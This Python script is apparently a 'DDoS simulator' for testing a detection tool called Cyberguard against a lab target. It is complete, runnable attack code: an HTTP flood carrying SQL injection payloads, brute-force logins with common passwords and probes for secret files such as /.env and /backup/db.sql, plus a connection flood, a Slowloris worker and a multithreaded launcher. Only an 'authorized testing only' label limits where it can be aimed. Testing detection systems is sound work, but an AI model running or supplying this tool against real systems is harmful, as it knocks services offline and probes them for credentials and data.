#!/usr/bin/env python3
"""
DDoS Attack Simulator — for authorized security testing only.

Simulates various DDoS attack patterns against a target host/port.
Designed to be run from another computer against the VulnLab or any
target service to test Cyberguard's detection and fail2ban integration.

Usage:
    python ddos_simulate.py --target 192.168.1.100 --port 9090
    python ddos_simulate.py --target 192.168.1.100 --port 8000 --attack syn
    python ddos_simulate.py --target 192.168.1.100 --port 9090 --attack http --duration 30
    python ddos_simulate.py --target 192.168.1.100 --port 9090 --attack slowloris

Attack types:
    http       - HTTP flood: high-volume GET/POST requests (default)
    syn        - TCP SYN flood: rapid connection attempts
    slowloris  - Slowloris: hold connections open with partial headers
    mixed      - Combined: rotates through all attack types
"""

import argparse
import os
import random
import socket
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# Attack payloads for HTTP flood
SQLI_PAYLOADS = [
    "/products?search=' OR 1=1--",
    "/products?id=1 UNION SELECT * FROM users--",
    "/products?search=' DROP TABLE users--",
    "/api/users?search=' OR ''='",
    "/login",
    "/api/login",
    "/products?search=%27%20OR%201%3D1--",
    "/products?id=1%20UNION%20SELECT%20*%20FROM%20users",
]

BRUTE_FORCE_USERS = ["admin", "root", "test", "user", "administrator", "guest"]
BRUTE_FORCE_PASSWORDS = ["password", "123456", "admin", "root", "letmein", "qwerty"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0)",
    "python-requests/2.31.0",
    "curl/7.88.1",
]

PATHS = [
    "/", "/login", "/products", "/admin", "/upload", "/ping",
    "/api/users", "/api/products", "/status", "/comments",
    "/config", "/robots.txt", "/.env", "/backup/db.sql",
    "/secret/keys.txt", "/api/system-info", "/logs",
]


class AttackStats:
    """Thread-safe attack statistics tracker."""

    def __init__(self):
        self.requests_sent = 0
        self.connections_made = 0
        self.errors = 0
        self.start_time = time.time()
        self._lock = threading.Lock()

    def inc_requests(self, n=1):
        with self._lock:
            self.requests_sent += n

    def inc_connections(self, n=1):
        with self._lock:
            self.connections_made += n

    def inc_errors(self, n=1):
        with self._lock:
            self.errors += n

    def report(self):
        elapsed = time.time() - self.start_time
        rps = self.requests_sent / max(elapsed, 0.001)
        print(f"\n{'='*60}")
        print(f"  Attack Statistics")
        print(f"{'='*60}")
        print(f"  Duration:         {elapsed:.1f}s")
        print(f"  Requests sent:    {self.requests_sent}")
        print(f"  Connections made: {self.connections_made}")
        print(f"  Errors:           {self.errors}")
        print(f"  Rate:             {rps:.0f} req/s")
        print(f"{'='*60}\n")


stats = AttackStats()


def http_flood_worker(target: str, port: int, duration: float, thread_id: int):
    """Send rapid HTTP requests to overwhelm the target."""
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, port))
            stats.inc_connections()

            # Randomly pick attack type
            attack = random.choice(["get", "post_login", "sqli", "scan"])

            if attack == "sqli":
                path = random.choice(SQLI_PAYLOADS)
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}:{port}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: close\r\n\r\n"
                )
            elif attack == "post_login":
                user = random.choice(BRUTE_FORCE_USERS)
                pwd = random.choice(BRUTE_FORCE_PASSWORDS)
                body = f"username={user}&password={pwd}"
                request = (
                    f"POST /login HTTP/1.1\r\n"
                    f"Host: {target}:{port}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{body}"
                )
            elif attack == "scan":
                path = random.choice(PATHS)
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}:{port}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: close\r\n\r\n"
                )
            else:
                # Random GET with junk params
                junk = ''.join(random.choices(string.ascii_letters, k=20))
                request = (
                    f"GET /?flood={junk} HTTP/1.1\r\n"
                    f"Host: {target}:{port}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: close\r\n\r\n"
                )

            sock.sendall(request.encode())
            stats.inc_requests()

            # Try to read response (don't block long)
            try:
                sock.recv(1024)
            except Exception:
                pass

            sock.close()
        except Exception:
            stats.inc_errors()
            try:
                sock.close()
            except Exception:
                pass
            time.sleep(0.01)


def syn_flood_worker(target: str, port: int, duration: float, thread_id: int):
    """Rapid TCP SYN connection attempts (connect and immediately close)."""
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect_ex((target, port))
            stats.inc_connections()
            stats.inc_requests()
            sock.close()
        except Exception:
            stats.inc_errors()
            try:
                sock.close()
            except Exception:
                pass
        # No sleep — maximum rate


def slowloris_worker(target: str, port: int, duration: float, thread_id: int):
    """Slowloris: open connections and keep them alive with partial headers."""
    sockets = []
    end_time = time.time() + duration

    # Open initial connections
    for _ in range(50):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, port))
            # Send partial HTTP request
            sock.sendall(
                f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode()
            )
            sockets.append(sock)
            stats.inc_connections()
            stats.inc_requests()
        except Exception:
            stats.inc_errors()

    # Keep connections alive with periodic partial headers
    while time.time() < end_time:
        for sock in list(sockets):
            try:
                sock.sendall(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                stats.inc_requests()
            except Exception:
                sockets.remove(sock)
                stats.inc_errors()
                # Replace dead connection
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(4)
                    new_sock.connect((target, port))
                    new_sock.sendall(
                        f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n"
                        f"Host: {target}\r\n".encode()
                    )
                    sockets.append(new_sock)
                    stats.inc_connections()
                except Exception:
                    stats.inc_errors()
        time.sleep(1)

    # Cleanup
    for sock in sockets:
        try:
            sock.close()
        except Exception:
            pass


def run_attack(target: str, port: int, attack_type: str, duration: float, threads: int):
    """Launch the specified attack with the given parameters."""
    workers = {
        "http": http_flood_worker,
        "syn": syn_flood_worker,
        "slowloris": slowloris_worker,
    }

    print(f"\n{'='*60}")
    print(f"  Cyberguard DDoS Simulator")
    print(f"{'='*60}")
    print(f"  Target:     {target}:{port}")
    print(f"  Attack:     {attack_type}")
    print(f"  Duration:   {duration}s")
    print(f"  Threads:    {threads}")
    print(f"  Started:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*60}")
    print(f"  Press Ctrl+C to stop early\n")

    if attack_type == "mixed":
        # Distribute threads across attack types
        attack_types = ["http", "syn", "slowloris"]
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futures = []
            for i in range(threads):
                at = attack_types[i % len(attack_types)]
                worker = workers[at]
                futures.append(pool.submit(worker, target, port, duration, i))
            # Show progress
            try:
                while any(not f.done() for f in futures):
                    elapsed = time.time() - stats.start_time
                    rps = stats.requests_sent / max(elapsed, 0.001)
                    print(
                        f"\r  [{elapsed:.0f}s] Sent: {stats.requests_sent} | "
                        f"Conn: {stats.connections_made} | "
                        f"Err: {stats.errors} | "
                        f"Rate: {rps:.0f}/s",
                        end="", flush=True,
                    )
                    time.sleep(0.5)
            except KeyboardInterrupt:
                print("\n  Stopping...")
    else:
        worker = workers.get(attack_type, http_flood_worker)
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futures = [pool.submit(worker, target, port, duration, i) for i in range(threads)]
            try:
                while any(not f.done() for f in futures):
                    elapsed = time.time() - stats.start_time
                    rps = stats.requests_sent / max(elapsed, 0.001)
                    print(
                        f"\r  [{elapsed:.0f}s] Sent: {stats.requests_sent} | "
                        f"Conn: {stats.connections_made} | "
                        f"Err: {stats.errors} | "
                        f"Rate: {rps:.0f}/s",
                        end="", flush=True,
                    )
                    time.sleep(0.5)
            except KeyboardInterrupt:
                print("\n  Stopping...")

    stats.report()


def main():
    parser = argparse.ArgumentParser(
        description="Cyberguard DDoS Attack Simulator — for authorized testing only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # HTTP flood against VulnLab on port 9090
  python ddos_simulate.py --target 192.168.1.100 --port 9090

  # SYN flood against backend API on port 8000
  python ddos_simulate.py --target 192.168.1.100 --port 8000 --attack syn

  # Slowloris against VulnLab for 60 seconds
  python ddos_simulate.py --target 192.168.1.100 --port 9090 --attack slowloris --duration 60

  # Mixed attack with 50 threads for 120 seconds
  python ddos_simulate.py --target 192.168.1.100 --port 9090 --attack mixed --threads 50 --duration 120
        """,
    )
    parser.add_argument("--target", "-t", required=True, help="Target IP or hostname")
    parser.add_argument("--port", "-p", type=int, required=True, help="Target port number")
    parser.add_argument(
        "--attack", "-a", default="http",
        choices=["http", "syn", "slowloris", "mixed"],
        help="Attack type (default: http)",
    )
    parser.add_argument("--duration", "-d", type=float, default=30, help="Duration in seconds (default: 30)")
    parser.add_argument("--threads", "-w", type=int, default=20, help="Number of worker threads (default: 20)")

    args = parser.parse_args()

    # Verify target is reachable
    print(f"\n  Checking connectivity to {args.target}:{args.port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((args.target, args.port))
        sock.close()
        if result != 0:
            print(f"  WARNING: Port {args.port} on {args.target} appears closed/unreachable")
            print(f"  Continuing anyway — the attack will generate traffic for detection\n")
    except Exception as e:
        print(f"  WARNING: Cannot reach {args.target}:{args.port} — {e}")
        print(f"  Continuing anyway...\n")

    try:
        run_attack(args.target, args.port, args.attack, args.duration, args.threads)
    except KeyboardInterrupt:
        stats.report()
        print("  Attack stopped by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()
